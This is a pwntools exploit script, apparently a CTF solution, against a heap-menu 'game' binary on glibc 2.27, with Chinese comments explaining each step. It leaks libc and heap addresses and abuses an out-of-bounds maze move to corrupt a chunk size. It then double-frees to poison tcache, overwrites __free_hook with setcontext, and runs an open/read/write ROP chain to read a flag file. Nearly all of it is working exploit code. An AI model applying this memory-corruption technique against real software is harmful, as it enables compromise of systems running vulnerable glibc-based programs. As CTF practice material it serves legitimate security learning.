# -*- coding: utf-8 -*
from pwn import *
from sys import argv

context.log_level = 'debug'
context.arch = 'amd64'
elf = ELF('game')
libc = ELF('/home/javayuan/pwn_libc合集/Ubuntu18_64/libc-2.27.so')
p = process('./game')

r = lambda : p.recv()
rx = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
itr = lambda : p.interactive()
def bytes2int(content):
	return str(content,encoding='utf-8')

def int2bytes(content):
	return bytes(str(content),encoding='utf-8')

def dbg():
	gdb.attach(p)
	pause()

def init(l, w):
    pad = b"op:1\nl:"+int2bytes(l)+b"\n"+b"w:"+int2bytes(w)+b"\n"
    sla(b"cmd> ", pad)

def create(id_, size, con):
    pad = b"op:2\nid:"+int2bytes(id_)+b"\n"+b"s:"+int2bytes(size)+b"\n"
    sla(b"cmd> ", pad)
    sa(b"desc> ", con)

def free(id_):
    pad = b"op:3\nid:"+int2bytes(id_)+b"\n"
    sla(b"cmd> ", pad)

def show():
    pad = b"op:4\n"
    sla(b"cmd> ", pad)

def up(id_):
    pad = b"op:5\nid:"+int2bytes(id_)+b"\n"
    sla(b"cmd> ", pad)

def down(id_):
    pad = b"op:6\nid:"+int2bytes(id_)+b"\n"
    sla(b"cmd> ", pad)

def left(id_):
    pad = b"op:7\nid:"+int2bytes(id_)+b"\n"
    sla(b"cmd> ", pad)

def right(id_):
    pad = b"op:8\nid:"+int2bytes(id_)+b"\n"
    sla(b"cmd> ", pad)



#leak libc
init(0x10,0x10)
# x/32gx $rebase(0x203028)
create(0x1,0x410,b'fanxinli')
payload = b'\x00'*0x1f0 + p64(0) + p64(0x201)
create(0x2,0x3f0,payload)
free(0x1)
create(0x3,0x410,b'aaaaaaaa')
show()
ru(b'aaaaaaaa')
libc_base = u64(rud(b'\n').ljust(8,b'\x00')) - libc.sym['__malloc_hook'] - 0x70
log.success('libc_base: '+hex(libc_base))
f_hook = libc_base+libc.sym["__free_hook"]
setcontext = libc_base+libc.sym["setcontext"]


#leak heap base
create(0x4,0x10,b'a')
show()
ru(b"(10,12) ")
info = u64(rud("\n").ljust(8, b"\x00"))
heap_base = (info & 0xfffffffffffff000) - 0x2000
log.success("heap_base: "+hex(heap_base))


#alloc to free_hook
create(0x6,0x410,b'aaaa')
for i in range(3):
    down(0x6)#数组越界，第六个人物的id在迷宫chunk中溢出到第一个人物的chunk中，因为init的迷宫chunk和第一个人物chunk相邻
    # dbg() #三次down后第一个人物chunk的size从0x421被改成0x621
free(0x3)
free(0x2)#这里2号和3号chunk只作为double free的对象，3号就是1号chunk，被修改size后可以覆盖2号的内容
create(0x1, 0x610, b"\x00"*0x410+p64(0)+p64(0x401)+p64(heap_base+0x10))#覆盖2号的fd指针为tcache的控制块
create(0x2, 0x3f0, b"fanxinli")#double free attack


###################
pop_rax = libc_base+0x00000000000439c8
pop_rdi = libc_base+0x000000000002155f
pop_rdx = libc_base+0x0000000000001b96
pop_rsi = libc_base+0x0000000000023e6a
Open = libc_base+libc.sym['open']
Read = libc_base+libc.sym['read']
Write = libc_base+libc.sym['write']
syscall = Read+0xf
flag = heap_base+0xc0+0x88

# open+read+write
orw  = p64(pop_rax)+p64(2)
orw += p64(pop_rdi)+p64(flag)
orw += p64(pop_rsi)+p64(0)
orw += p64(syscall)
orw += p64(pop_rdi)+p64(3)
orw += p64(pop_rsi)+p64(flag)
orw += p64(pop_rdx)+p64(0x30)
orw += p64(Read)
orw += p64(pop_rdi)+p64(1)
orw += p64(Write)
log.success("len orw: " + hex(len(orw)))
###################

payload = b"\x00"*7+b"\x01"+b"\x00"*(0x38+7*8)#将0x80tcache的count设为1，即free_hook的地址
payload += p64(f_hook)+b"\x00"*0x20
payload += p64(heap_base+0xc0)+p64(pop_rdi+1)#rdi+0xa0的位置，这里是直接拿tcache控制块当作setcontext的释放块了
#注意看这里还要加上一个ret（即pop_rdi+1），原因是setcontext中会push rcx，rcx的值又是rdi+0xa8
#setcontext执行完毕后会执行ret rcx，需要把push降低的栈给拉回来，故需要加上ret
payload += orw+b"./flag\x00"

create(0x3, 0x3F0, payload)
create(0x4, 0x80, p64(setcontext+53))
free(0x3)
itr()
